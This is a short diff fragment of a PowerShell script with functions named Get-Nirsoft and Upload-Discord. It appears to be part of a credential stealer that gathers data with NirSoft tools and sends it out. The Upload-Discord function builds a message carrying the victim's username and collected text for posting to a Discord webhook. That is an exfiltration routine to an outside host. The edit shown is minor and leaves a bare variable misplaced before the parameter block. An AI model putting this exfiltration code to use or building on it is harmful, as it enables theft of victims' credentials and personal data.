@@ -10,7 +10,7 @@ function Get-Nirsoft {
 }
 
 function Upload-Discord {
-
+$DiscordUrl
 [CmdletBinding()]
 param (
     [parameter(Position=0,Mandatory=$False)]
@@ -22,6 +22,7 @@ param (
 
 
 $Body = @{
+
   'username' = $env:username
   'content' = $text
 }
